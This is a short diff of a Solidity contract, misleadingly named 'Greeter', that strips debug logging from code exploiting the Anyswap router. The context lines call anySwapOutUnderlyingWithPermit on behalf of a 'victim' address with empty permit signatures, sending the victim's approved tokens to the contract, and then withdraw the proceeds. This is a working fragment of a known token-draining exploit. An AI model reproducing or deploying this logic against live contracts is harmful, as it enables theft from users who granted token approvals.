@@ -2,7 +2,6 @@
 pragma solidity ^0.8.0;
 
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
-import "hardhat/console.sol";
 
 interface IAnyswapRouterV4 {
     function anySwapOutUnderlyingWithPermit(
@@ -70,7 +69,5 @@ contract Greeter {
             IAnyswapRouterV4(ANYSWAP_ROUTER_V4).anySwapOutUnderlyingWithPermit(victim, address(ANYSWAP_V1_WETH), address(this), amount, block.timestamp + 120, 0, bytes32(""), bytes32(""), 56);        
         }
         ANYSWAP_V1_WETH.withdraw();
-
-        console.log('weth balance:', IERC20(WETH).balanceOf(address(this)));
     }
 }
